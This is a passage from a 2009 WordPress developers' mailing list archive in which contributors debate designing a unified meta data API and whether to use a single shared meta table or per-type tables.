have a "common" meta if wanted.


> So... You're suggesting making a whole new table every time a plugin
> wants to add some bit of meta, rather than simply adding a column to
> the meta table?
>
> No offense, but if I had a giant lever I could pull to open a trap
> door and drop you into the Sarlaac Pit, I would be reaching for it
> about now....
>
> Stephen
>
> P.S. -- Sorry if that seems overly harsh.  My uncle was eaten by a
> sarlaac, so I probably shouldn't joke.
>
> On Jul 24, 2009, at 6:25 AM, scribu <scribu at gmail.com> wrote:
>
>> I propose that Core have an API for creating standard meta tables for
>> whatever plugins need.
>>
>> Of course, this would be accompanied by unified functions for
>> handling meta
>> data in said tables.
>>
>> Example: A plugin needs a comment meta table. First, it makes sure
>> it's
>> available:
>>
>> register_activation_hook(__FILE__, 'example_plugin_activation');
>>
>> function example_plugin_activation() {
>>   enable_meta_table('comment');
>> }
>>
>>
>> Then, it uses it to store data, etc.:
>>
>> ...
>> add_meta('comment', $comment_id, $meta_key, $meta_value);
>> ...
>>
>>
>> I am willing to code this API, if people think it's a sound ideea.
>>
>>
>> By the way, I also wrote a blog post about this:
>> http://scribu.net/wordpress/meta-tables-for-wordpress.html
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



From otto at ottodestruct.com  Fri Jul 24 17:03:33 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 24 Jul 2009 12:03:33 -0500
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
Message-ID: <161617690907241003o23c0cabfy606ae0d0e98ca772@mail.gmail.com>

On Fri, Jul 24, 2009 at 5:21 AM, scribu<scribu at gmail.com> wrote:
> - WP core shouldn't create tables that it doesn't use. The same principle is
> applied to bundled javascript and php classes.

I agree with this. However, there's several things that the core could
be putting into a comment meta table. A lot of the lesser used columns
could be moved to meta data and this speed up comments retrieval
(probably by a trivial amount, but hey).

Check out the comments table schema:

  comment_ID bigint(20) unsigned NOT NULL auto_increment,
  comment_post_ID bigint(20) unsigned NOT NULL default '0',
  comment_author tinytext NOT NULL,
  comment_author_email varchar(100) NOT NULL default '',
  comment_author_url varchar(200) NOT NULL default '',
  comment_author_IP varchar(100) NOT NULL default '',
  comment_date datetime NOT NULL default '0000-00-00 00:00:00',
  comment_date_gmt datetime NOT NULL default '0000-00-00 00:00:00',
  comment_content text NOT NULL,
  comment_karma int(11) NOT NULL default '0',
  comment_approved varchar(20) NOT NULL default '1',
  comment_agent varchar(255) NOT NULL default '',
  comment_type varchar(20) NOT NULL default '',
  comment_parent bigint(20) unsigned NOT NULL default '0',
  user_id bigint(20) unsigned NOT NULL default '0',

Is the author IP critical information that is used a lot? How about
the agent? And WTF is karma?

Yes, we need comment meta for plugins. But we could just as easily
move some of this stuff in there too, perhaps even expanding the core
functionality a bit in the process.


-Otto

From otto at ottodestruct.com  Fri Jul 24 17:07:21 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 24 Jul 2009 12:07:21 -0500
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
Message-ID: <161617690907241007i4fc89e55w34a0f54d838f148b@mail.gmail.com>

On Fri, Jul 24, 2009 at 5:21 AM, scribu<scribu at gmail.com> wrote:
> ...
> add_meta('comment', $comment_id, $meta_key, $meta_value);
> ...

Oh, also, combining all the meta code together into a set of combined
functions is a damn good idea, even if they do use separate tables.

However, I'm not certain about creating meta tables on the fly yet.
This runs into a plugin uninstall issue to me. The metadata can be
removed, but how do you remove the table when other plugins might use
it as well? Check when it's empty then drop it? Seems error prone.


-Otto
Sent from Memphis, TN, United States

From jaredbangs at gmail.com  Fri Jul 24 17:20:44 2009
From: jaredbangs at gmail.com (Jared Bangs)
Date: Fri, 24 Jul 2009 10:20:44 -0700
Subject: [wp-hackers] Rebuttal (re: Meta tables: Take 5)
In-Reply-To: <C87B155E-6AE5-4EDF-B711-71EBF5B6D53B@ftwr.co.uk>
References: <4A69D576.1010005@santosj.name>
	<C87B155E-6AE5-4EDF-B711-71EBF5B6D53B@ftwr.co.uk>
Message-ID: <7b4922320907241020q15970c51v7a1c8c58eb4fe4f9@mail.gmail.com>

On Fri, Jul 24, 2009 at 8:46 AM, Peter Westwood
<peter.westwood at ftwr.co.uk>wrote:

>
> Agreed
>
> I was very careful in my proposal [1] to talk about an api which was db
> structure agnostic, because they may be arguments both ways and I think the
> storage mechanism should be completely separate from the api and it is
> really the api we need to decide on first!
>
> Once we have actually got some data about what is being stored and what is
> being queried there may be cases when a object type specific meta table is
> required but I would expect that for 80% of use cases a single table would
> be fine.
>
> For what its worth bbPress is built around a single meta table [2] (which
> even the options go in)
>
> westi
>
> [1]
> http://blog.ftwr.co.uk/archives/2009/07/23/a-better-meta-api-for-wordpress/
> [2]
> http://trac.bbpress.org/browser/trunk/bb-admin/includes/defaults.bb-schema.php#L2<http://trac.bbpress.org/browser/trunk/bb-admin/includes/defaults.bb-schema.php#L28>


+1 vote for implementing sooner rather than later, using the API Peter laid
out. Sounds like everyone can agree on that point, and I think he's correct
in saying that's what matters for consistency and ease of use for plugin
authors.

The single-table / multi-table decision is an implementation detail behind
the API, and one which almost everyone using the API (active participants on
this list topic excluded, of course) would have no strong opinion on either
way, and should never have to know or care about until it becomes an issue
for them.

On that point, it seems like a single table approach would be the simplest
and would adequately address the needs of the vast majority of the blogs out
there, while avoiding the extra complexity for the cases where it isn't
needed.

So I'd say put that in the core (at least initially), and put enough hooks
in so that people running sites that somehow justify the split table
approach can change out the storage code behind those API calls without
affecting all the plugins that are using the API. Someone who really needed
the multiple tables could then pretty easily whip up a plugin to do this,
including migrating all the stuff from the single table upon activation.

From scribu at gmail.com  Fri Jul 24 17:21:06 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 20:21:06 +0300
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <161617690907241003o23c0cabfy606ae0d0e98ca772@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<161617690907241003o23c0cabfy606ae0d0e98ca772@mail.gmail.com>
Message-ID: <349fe48b0907241021k61337ccdrb4ed3fbb450ebdc0@mail.gmail.com>

On Fri, Jul 24, 2009 at 8:03 PM, Otto <otto at ottodestruct.com> wrote:

> On Fri, Jul 24, 2009 at 5:21 AM, scribu<scribu at gmail.com> wrote:
> > - WP core shouldn't create tables that it doesn't use. The same principle
> is
> > applied to bundled javascript and php classes.
>
> I agree with this. However, there's several things that the core could
> be putting into a comment meta table. A lot of the lesser used columns
> could be moved to meta data and this speed up comments retrieval
> (probably by a trivial amount, but hey).


Well, if it was decided that it would be better to move all those columns to
meta, sure.


I was very careful in my proposal [1] to talk about an api which was db
> structure agnostic, because they may be arguments both ways and I think the
> storage mechanism should be completely separate from the api and it is
> really the api we need to decide on first!
>


Ok, so let's focus on the API.

First, a function to register new meta types:

register_meta_type($type);


Then we have generalizations of the *_post_meta() functions:

 function add_meta($type, $id, $key, $value, $single);

function update_meta($type, $id, $key, $value, $old_value);

function get_meta($type, $id, $key, $value, $single);

function delete_meta($type, $id, $key, $value);


We need to think how to map these functions:

get_post_custom($id);

get_post_custom_keys($id);

get_post_custom_values($id);


Also, westi proposed functions for manipulating by key:

get_meta_by_key($type, $key);

delete_meta_by_key($type, $key);


But we can go a step further and handle an entire type:

get_meta_by_type($type);

delete_meta_by_type($type);


This is just the first draft, so don't starve the sarlaac yet.


-- 
http://scribu.net

From scribu at gmail.com  Fri Jul 24 17:21:06 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 20:21:06 +0300
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <161617690907241003o23c0cabfy606ae0d0e98ca772@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<161617690907241003o23c0cabfy606ae0d0e98ca772@mail.gmail.com>
Message-ID: <349fe48b0907241021k61337ccdrb4ed3fbb450ebdc0@mail.gmail.com>

On Fri, Jul 24, 2009 at 8:03 PM, Otto <otto at ottodestruct.com> wrote:

> On Fri, Jul 24, 2009 at 5:21 AM, scribu<scribu at gmail.com> wrote:
> > - WP core shouldn't create tables that it doesn't use. The same principle
> is
> > applied to bundled javascript and php classes.
>
> I agree with this. However, there's several things that the core could
> be putting into a comment meta table. A lot of the lesser used columns
> could be moved to meta data and this speed up comments retrieval
> (probably by a trivial amount, but hey).


Well, if it was decided that it would be better to move all those columns to
meta, sure.


I was very careful in my proposal [1] to talk about an api which was db
> structure agnostic, because they may be arguments both ways and I think the
> storage mechanism should be completely separate from the api and it is
> really the api we need to decide on first!
>


Ok, so let's focus on the API.

First, a function to register new meta types:

register_meta_type($type);


Then we have generalizations of the *_post_meta() functions:

 function add_meta($type, $id, $key, $value, $single);

function update_meta($type, $id, $key, $value, $old_value);

function get_meta($type, $id, $key, $value, $single);

function delete_meta($type, $id, $key, $value);


We need to think how to map these functions:

get_post_custom($id);

get_post_custom_keys($id);

get_post_custom_values($id);


Also, westi proposed functions for manipulating by key:

get_meta_by_key($type, $key);

delete_meta_by_key($type, $key);


But we can go a step further and handle an entire type:

get_meta_by_type($type);

delete_meta_by_type($type);


This is just the first draft, so don't starve the sarlaac yet.


-- 
http://scribu.net

From scribu at gmail.com  Fri Jul 24 17:21:06 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 20:21:06 +0300
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <161617690907241003o23c0cabfy606ae0d0e98ca772@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<161617690907241003o23c0cabfy606ae0d0e98ca772@mail.gmail.com>
Message-ID: <349fe48b0907241021k61337ccdrb4ed3fbb450ebdc0@mail.gmail.com>

On Fri, Jul 24, 2009 at 8:03 PM, Otto <otto at ottodestruct.com> wrote:

> On Fri, Jul 24, 2009 at 5:21 AM, scribu<scribu at gmail.com> wrote:
> > - WP core shouldn't create tables that it doesn't use. The same principle
> is
> > applied to bundled javascript and php classes.
>
> I agree with this. However, there's several things that the core could
> be putting into a comment meta table. A lot of the lesser used columns
> could be moved to meta data and this speed up comments retrieval
> (probably by a trivial amount, but hey).


Well, if it was decided that it would be better to move all those columns to
meta, sure.


I was very careful in my proposal [1] to talk about an api which was db
> structure agnostic, because they may be arguments both ways and I think the
> storage mechanism should be completely separate from the api and it is
> really the api we need to decide on first!
>


Ok, so let's focus on the API.

First, a function to register new meta types:

register_meta_type($type);


Then we have generalizations of the *_post_meta() functions:

 function add_meta($type, $id, $key, $value, $single);

function update_meta($type, $id, $key, $value, $old_value);

function get_meta($type, $id, $key, $value, $single);

function delete_meta($type, $id, $key, $value);


We need to think how to map these functions:

get_post_custom($id);

get_post_custom_keys($id);

get_post_custom_values($id);


Also, westi proposed functions for manipulating by key:

get_meta_by_key($type, $key);

delete_meta_by_key($type, $key);


But we can go a step further and handle an entire type:

get_meta_by_type($type);

delete_meta_by_type($type);


This is just the first draft, so don't starve the sarlaac yet.


-- 
http://scribu.net

From scribu at gmail.com  Fri Jul 24 17:25:47 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 20:25:47 +0300
Subject: [wp-hackers] Rebuttal (re: Meta tables: Take 5)
In-Reply-To: <7b4922320907241020q15970c51v7a1c8c58eb4fe4f9@mail.gmail.com>
References: <4A69D576.1010005@santosj.name>
	<C87B155E-6AE5-4EDF-B711-71EBF5B6D53B@ftwr.co.uk>
	<7b4922320907241020q15970c51v7a1c8c58eb4fe4f9@mail.gmail.com>
Message-ID: <349fe48b0907241025x583b38d2i5d9664e88eddb412@mail.gmail.com>

Jared, that's a very sensible point of view. +1


-- 
http://scribu.net

From mikeschinkel at newclarity.net  Fri Jul 24 17:29:00 2009
From: mikeschinkel at newclarity.net (mikeschinkel at newclarity.net)
Date: Fri, 24 Jul 2009 12:29:00 -0500 (CDT)
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <161617690907241007i4fc89e55w34a0f54d838f148b@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<161617690907241007i4fc89e55w34a0f54d838f148b@mail.gmail.com>
Message-ID: <FEC7FDC7-7C0A-474C-AE56-3C75F1ACAA30@newclarity.net>

It could use reference counting implemented in a core function.  
Reference count could be stored in wp_options.

Sent from my iPhone

On Jul 24, 2009, at 1:08 PM, Otto <otto at ottodestruct.com> wrote:

> On Fri, Jul 24, 2009 at 5:21 AM, scribu<scribu at gmail.com> wrote:
>> ...
>> add_meta('comment', $comment_id, $meta_key, $meta_value);
>> ...
>
> Oh, also, combining all the meta code together into a set of combined
> functions is a damn good idea, even if they do use separate tables.
>
> However, I'm not certain about creating meta tables on the fly yet.
> This runs into a plugin uninstall issue to me. The metadata can be
> removed, but how do you remove the table when other plugins might use
> it as well? Check when it's empty then drop it? Seems error prone.
>
>
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From mikeschinkel at newclarity.net  Fri Jul 24 17:32:57 2009
From: mikeschinkel at newclarity.net (mikeschinkel at newclarity.net)
Date: Fri, 24 Jul 2009 12:32:57 -0500 (CDT)
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <161617690907241003o23c0cabfy606ae0d0e98ca772@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<161617690907241003o23c0cabfy606ae0d0e98ca772@mail.gmail.com>
Message-ID: <48B632E7-B03B-4372-B3C7-03C6CB5E0FD0@newclarity.net>

The speedup you'd get from moving to comment meta would be trivial,  
and the potential performance reduction for sites that use that info  
could be substantial. I would not move it. It could also harm backward  
compatibility.

Sent from my iPhone

On Jul 24, 2009, at 1:06 PM, Otto <otto at ottodestruct.com> wrote:

> On Fri, Jul 24, 2009 at 5:21 AM, scribu<scribu at gmail.com> wrote:
>> - WP core shouldn't create tables that it doesn't use. The same  
>> principle is
>> applied to bundled javascript and php classes.
>
> I agree with this. However, there's several things that the core could
> be putting into a comment meta table. A lot of the lesser used columns
> could be moved to meta data and this speed up comments retrieval
> (probably by a trivial amount, but hey).
>
> Check out the comments table schema:
>
>  comment_ID bigint(20) unsigned NOT NULL auto_increment,
>  comment_post_ID bigint(20) unsigned NOT NULL default '0',
>  comment_author tinytext NOT NULL,
>  comment_author_email varchar(100) NOT NULL default '',
>  comment_author_url varchar(200) NOT NULL default '',
>  comment_author_IP varchar(100) NOT NULL default '',
>  comment_date datetime NOT NULL default '0000-00-00 00:00:00',
>  comment_date_gmt datetime NOT NULL default '0000-00-00 00:00:00',
>  comment_content text NOT NULL,
>  comment_karma int(11) NOT NULL default '0',
>  comment_approved varchar(20) NOT NULL default '1',
>  comment_agent varchar(255) NOT NULL default '',
>  comment_type varchar(20) NOT NULL default '',
>  comment_parent bigint(20) unsigned NOT NULL default '0',
>  user_id bigint(20) unsigned NOT NULL default '0',
>
> Is the author IP critical information that is used a lot? How about
> the agent? And WTF is karma?
>
> Yes, we need comment meta for plugins. But we could just as easily
> move some of this stuff in there too, perhaps even expanding the core
> functionality a bit in the process.
>
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From mikeschinkel at newclarity.net  Fri Jul 24 17:44:08 2009
From: mikeschinkel at newclarity.net (mikeschinkel at newclarity.net)
Date: Fri, 24 Jul 2009 12:44:08 -0500 (CDT)
Subject: [wp-hackers] Rebuttal (re: Meta tables: Take 5)
In-Reply-To: <7b4922320907241020q15970c51v7a1c8c58eb4fe4f9@mail.gmail.com>
References: <4A69D576.1010005@santosj.name>
	<C87B155E-6AE5-4EDF-B711-71EBF5B6D53B@ftwr.co.uk>
	<7b4922320907241020q15970c51v7a1c8c58eb4fe4f9@mail.gmail.com>
Message-ID: <3A028496-5FA0-47DD-9830-7213D7CA2176@newclarity.net>

+10 Best approach yet.

One thing to consider; in the "standard" approach would it make sense  
to have meta type stored in it's own table so that the type field in  
the meta table could be an INT and thus stored and indexed efficiently?

Sent from my iPhone

On Jul 24, 2009, at 1:24 PM, Jared Bangs <jaredbangs at gmail.com> wrote:

> On Fri, Jul 24, 2009 at 8:46 AM, Peter Westwood
> <peter.westwood at ftwr.co.uk>wrote:
>
>>
>> Agreed
>>
>> I was very careful in my proposal [1] to talk about an api which  
>> was db
>> structure agnostic, because they may be arguments both ways and I  
>> think the
>> storage mechanism should be completely separate from the api and it  
>> is
>> really the api we need to decide on first!
>>
>> Once we have actually got some data about what is being stored and  
>> what is
>> being queried there may be cases when a object type specific meta  
>> table is
>> required but I would expect that for 80% of use cases a single  
>> table would
>> be fine.
>>
>> For what its worth bbPress is built around a single meta table [2]  
>> (which
>> even the options go in)
>>
>> westi
>>
>> [1]
>> http://blog.ftwr.co.uk/archives/2009/07/23/a-better-meta-api-for-wordpress/
>> [2]
>> http://trac.bbpress.org/browser/trunk/bb-admin/includes/defaults.bb- 
>> schema.php#L2<http://trac.bbpress.org/browser/trunk/bb-admin/includes/defaults.bb-schema.php#L28 
>> >
>
>
> +1 vote for implementing sooner rather than later, using the API  
> Peter laid
> out. Sounds like everyone can agree on that point, and I think he's  
> correct
> in saying that's what matters for consistency and ease of use for  
> plugin
> authors.
>
> The single-table / multi-table decision is an implementation detail  
> behind
> the API, and one which almost everyone using the API (active  
> participants on
> this list topic excluded, of course) would have no strong opinion on  
> either
> way, and should never have to know or care about until it becomes an  
> issue
> for them.
>
> On that point, it seems like a single table approach would be the  
> simplest
> and would adequately address the needs of the vast majority of the  
> blogs out
> there, while avoiding the extra complexity for the cases where it  
> isn't
> needed.
>
> So I'd say put that in the core (at least initially), and put enough  
> hooks
> in so that people running sites that somehow justify the split table
> approach can change out the storage code behind those API calls  
> without
> affecting all the plugins that are using the API. Someone who really  
> needed
> the multiple tables could then pretty easily whip up a plugin to do  
> this,
> including migrating all the stuff from the single table upon  
> activation.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From scribu at gmail.com  Fri Jul 24 17:46:22 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 20:46:22 +0300
Subject: [wp-hackers] Rebuttal (re: Meta tables: Take 5)
In-Reply-To: <3A028496-5FA0-47DD-9830-7213D7CA2176@newclarity.net>
References: <4A69D576.1010005@santosj.name>
	<C87B155E-6AE5-4EDF-B711-71EBF5B6D53B@ftwr.co.uk>
	<7b4922320907241020q15970c51v7a1c8c58eb4fe4f9@mail.gmail.com>
	<3A028496-5FA0-47DD-9830-7213D7CA2176@newclarity.net>
Message-ID: <349fe48b0907241046r35385a3dk3c28b5dd86b482ae@mail.gmail.com>

On Fri, Jul 24, 2009 at 8:44 PM, <mikeschinkel at newclarity.net> wrote:

> One thing to consider; in the "standard" approach would it make sense to
> have meta type stored in it's own table so that the type field in the meta
> table could be an INT and thus stored and indexed efficiently?
>


I don't think there would be that many types to justify an additional table,
at least not at first.


-- 
http://scribu.net

From aaron at xavisys.com  Fri Jul 24 17:49:26 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Fri, 24 Jul 2009 10:49:26 -0700
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <161617690907241007i4fc89e55w34a0f54d838f148b@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<161617690907241007i4fc89e55w34a0f54d838f148b@mail.gmail.com>
Message-ID: <4A69F426.1020802@xavisys.com>

Taking the examples given, you can't drop it when it's empty because the 
plugin would check for it on activation.  For example:
* Plugin A activates and creates a comment meta table.
* Plugin A adds a couple things to the comment meta table.
* Plugin B activates and sees that a comment table already exists
* Plugin A is removed as are it's entries in the comment meta table.

Now the table is empty but if you remove it plugin B will have 
problems.  I think you'd actually have to implement some sort of 
reference count if you want to be able to remove the tables.

However, plugins can already add tables, it's done quite often.  It 
seems that the meta data solution should really just meet the 80/20 rule 
and a plugin can always create their own tables if they need something 
specific.

Otto wrote:
> On Fri, Jul 24, 2009 at 5:21 AM, scribu<scribu at gmail.com> wrote:
>   
>> ...
>> add_meta('comment', $comment_id, $meta_key, $meta_value);
>> ...
>>     
>
> Oh, also, combining all the meta code together into a set of combined
> functions is a damn good idea, even if they do use separate tables.
>
> However, I'm not certain about creating meta tables on the fly yet.
> This runs into a plugin uninstall issue to me. The metadata can be
> removed, but how do you remove the table when other plugins might use
> it as well? Check when it's empty then drop it? Seems error prone.
>
>
> -Otto
> Sent from Memphis, TN, United States
>   


From aaron at xavisys.com  Fri Jul 24 17:54:55 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Fri, 24 Jul 2009 10:54:55 -0700
Subject: [wp-hackers] Rebuttal (re: Meta tables: Take 5)
In-Reply-To: <349fe48b0907241046r35385a3dk3c28b5dd86b482ae@mail.gmail.com>
References: <4A69D576.1010005@santosj.name>	<C87B155E-6AE5-4EDF-B711-71EBF5B6D53B@ftwr.co.uk>	<7b4922320907241020q15970c51v7a1c8c58eb4fe4f9@mail.gmail.com>	<3A028496-5FA0-47DD-9830-7213D7CA2176@newclarity.net>
	<349fe48b0907241046r35385a3dk3c28b5dd86b482ae@mail.gmail.com>
Message-ID: <4A69F56F.4060708@xavisys.com>

I might agree with you, but it's the "not at first" that scares me.  If 
it's something that will "probably" happen, then we should do it now 
(while things are already being changed).  It will be way harder to 
change it later.  However, I'm not sure it would really be needed at 
all.  I'll have to think about it a bit.

scribu wrote:
> On Fri, Jul 24, 2009 at 8:44 PM, <mikeschinkel at newclarity.net> wrote:
>   
>> One thing to consider; in the "standard" approach would it make sense to
>> have meta type stored in it's own table so that the type field in the meta
>> table could be an INT and thus stored and indexed efficiently?
>>     
> I don't think there would be that many types to justify an additional table,
> at least not at first.
>
>   


From scribu at gmail.com  Fri Jul 24 17:58:12 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 20:58:12 +0300
Subject: [wp-hackers] Rebuttal (re: Meta tables: Take 5)
In-Reply-To: <4A69F56F.4060708@xavisys.com>
References: <4A69D576.1010005@santosj.name>
	<C87B155E-6AE5-4EDF-B711-71EBF5B6D53B@ftwr.co.uk>
	<7b4922320907241020q15970c51v7a1c8c58eb4fe4f9@mail.gmail.com>
	<3A028496-5FA0-47DD-9830-7213D7CA2176@newclarity.net>
	<349fe48b0907241046r35385a3dk3c28b5dd86b482ae@mail.gmail.com>
	<4A69F56F.4060708@xavisys.com>
Message-ID: <349fe48b0907241058h67d9a93eid4fce06e85aa5927@mail.gmail.com>

For the sake of sanity, can we please keep the discussion only on the
original topic?

It's very inconvenient to constantly switch between threads.


-- 
http://scribu.net

From mikeschinkel at newclarity.net  Fri Jul 24 17:58:43 2009
From: mikeschinkel at newclarity.net (mikeschinkel at newclarity.net)
Date: Fri, 24 Jul 2009 12:58:43 -0500 (CDT)
Subject: [wp-hackers] Rebuttal (re: Meta tables: Take 5)
In-Reply-To: <349fe48b0907241046r35385a3dk3c28b5dd86b482ae@mail.gmail.com>
References: <4A69D576.1010005@santosj.name>
	<C87B155E-6AE5-4EDF-B711-71EBF5B6D53B@ftwr.co.uk>
	<7b4922320907241020q15970c51v7a1c8c58eb4fe4f9@mail.gmail.com>
	<3A028496-5FA0-47DD-9830-7213D7CA2176@newclarity.net>
	<349fe48b0907241046r35385a3dk3c28b5dd86b482ae@mail.gmail.com>
Message-ID: <264C5C82-6BA3-4FCF-8D4B-C1B73E32C024@newclarity.net>

For clarity, it's not the number of types that would matter, it's the  
number of meta records that would matter.  Each meta record could  
store an int or a varchar(??).

With 100k records and 10 meta per record you can easily get 1 million+  
strings in an index which isn't nearly as efficient as ints.

JMTCW.


Sent from my iPhone

On Jul 24, 2009, at 1:50 PM, scribu <scribu at gmail.com> wrote:

> On Fri, Jul 24, 2009 at 8:44 PM, <mikeschinkel at newclarity.net> wrote:
>
>> One thing to consider; in the "standard" approach would it make  
>> sense to
>> have meta type stored in it's own table so that the type field in  
>> the meta
>> table could be an INT and thus stored and indexed efficiently?
>>
>
>
> I don't think there would be that many types to justify an  
> additional table,
> at least not at first.
>
>
> -- 
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From wp-hackers at striderweb.com  Fri Jul 24 17:59:04 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Fri, 24 Jul 2009 12:59:04 -0500
Subject: [wp-hackers] Rebuttal (re: Meta tables: Take 5)
In-Reply-To: <7b4922320907241020q15970c51v7a1c8c58eb4fe4f9@mail.gmail.com>
References: <4A69D576.1010005@santosj.name>
	<C87B155E-6AE5-4EDF-B711-71EBF5B6D53B@ftwr.co.uk>
	<7b4922320907241020q15970c51v7a1c8c58eb4fe4f9@mail.gmail.com>
Message-ID: <0C8FA9F8-AE0D-4BC7-ADD5-0A783288B496@striderweb.com>

On Jul 24, 2009, at 12:20 PM, Jared Bangs wrote:

> So I'd say put [a single table approach] in the core (at least  
> initially), and put enough hooks in so that people running sites  
> that somehow justify the split table approach can change out the  
> storage code behind those API calls without affecting all the  
> plugins that are using the API. Someone who really needed the  
> multiple tables could then pretty easily whip up a plugin to do  
> this, including migrating all the stuff from the single table upon  
> activation.


+1

If done properly, a plugin could be written that could

1) separate *all* such meta into separate tables (per blog or per  
plugin?), or

2) simply separate its own meta into a separate table.

Stephen

P.S. -- scribu -- Now I'm going to have to find a way to work the  
phrase "starve/feed the sarlaac" into everyday conversation.  ;-)

From shacker at birdhouse.org  Fri Jul 24 18:13:19 2009
From: shacker at birdhouse.org (Scot Hacker)
Date: Fri, 24 Jul 2009 11:13:19 -0700
Subject: [wp-hackers] Single sign-on SSL domain
In-Reply-To: <mailman.608.1248384903.16651.wp-hackers@lists.automattic.com>
References: <mailman.608.1248384903.16651.wp-hackers@lists.automattic.com>
Message-ID: <8DFEF56F-B1BF-4891-92EC-71AA125DD250@birdhouse.org>

>
> Date: Thu, 23 Jul 2009 11:54:15 -0400
> From: Stephane Daury <wordpress at tekartist.org>
>
> Oh boy, you're in a world of pain on this one, especially if you have
> a lot of domains (not subdomains), which the wildcard cert won't help
> you with. Uou'd also still have the IP-per-host requirement,
> regardless of if it's a wildcard or not.

Just wanted to say thanks for all the excellent responses on this.  
We're evaluating the options with our admins now. Honestly, the apache- 
based solutions do sound pretty painful, especially given that this is  
a cpanel-based server and it will mean some pretty deep tinkering with  
the default vhost setup/generation internals. Sounds like changes in  
2.8 may make it feasible to get a patch for forcing OpenID logins, and  
that's sounding more attractive all the time in terms of not having to  
mess with our server setup too much.

Thanks all,
Scot


From beau at dentedreality.com.au  Fri Jul 24 18:21:52 2009
From: beau at dentedreality.com.au (Beau Lebens)
Date: Fri, 24 Jul 2009 11:21:52 -0700
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <4A69F426.1020802@xavisys.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<161617690907241007i4fc89e55w34a0f54d838f148b@mail.gmail.com>
	<4A69F426.1020802@xavisys.com>
Message-ID: <902424490907241121u7188bb67qc6fc7eb990207585@mail.gmail.com>

I'd personally be opposed to the approach of creating new tables for
every plugin/etc that wanted some meta, if for no other reason than in
a secure environment, my DB user should NOT have (or require) the
privileges to CREATE (or DROP) tables in my database.

The approach I've been thinking would be to have 2 different meta tables (only):

wp_global_meta
wp_meta

then, on an WPMU installation, you'd get

wp_global_meta
wp_1_meta
wp_2_meta
wp_3_meta etc

All of those tables would look the same, and it'd be something like this:

id
object_type
object_id
key
value

So for example, a row might contain:

1
post
123
do_something_cool
yes

Which would apply specifically to the post with the ID 123. The reason
I would go for a global + a blog-specific one is to handle the
requirement for WPMU having the concept of global meta information
(e.g. user meta) that applies across all blogs, while individual blogs
having meta that only relates within the confines of their own
context. This approach would break up the storage a bit to avoid
things getting too monstrously large, while still getting everything
in one place, but allowing for decent table indexing (on object_id).

That's just my 0.02c on the whole issue ;)

Beau

From otto at ottodestruct.com  Fri Jul 24 19:01:13 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 24 Jul 2009 14:01:13 -0500
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <349fe48b0907241021k61337ccdrb4ed3fbb450ebdc0@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com> 
	<161617690907241003o23c0cabfy606ae0d0e98ca772@mail.gmail.com> 
	<349fe48b0907241021k61337ccdrb4ed3fbb450ebdc0@mail.gmail.com>
Message-ID: <161617690907241201h60fbc7f4ka7f67581e02abd59@mail.gmail.com>

On Fri, Jul 24, 2009 at 12:21 PM, scribu<scribu at gmail.com> wrote:
> We need to think how to map these functions:
> get_post_custom($id);
> get_post_custom_keys($id);
> get_post_custom_values($id);

Don't worry about those existing functions. Implement the base, then
they can be rewritten to use the new base functions and provide
backward compatibility.

-Otto

From scribu at gmail.com  Fri Jul 24 19:36:09 2009
From: scribu at gmail.com (scribu)
Date: Fri, 24 Jul 2009 22:36:09 +0300
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <161617690907241201h60fbc7f4ka7f67581e02abd59@mail.gmail.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<161617690907241003o23c0cabfy606ae0d0e98ca772@mail.gmail.com>
	<349fe48b0907241021k61337ccdrb4ed3fbb450ebdc0@mail.gmail.com>
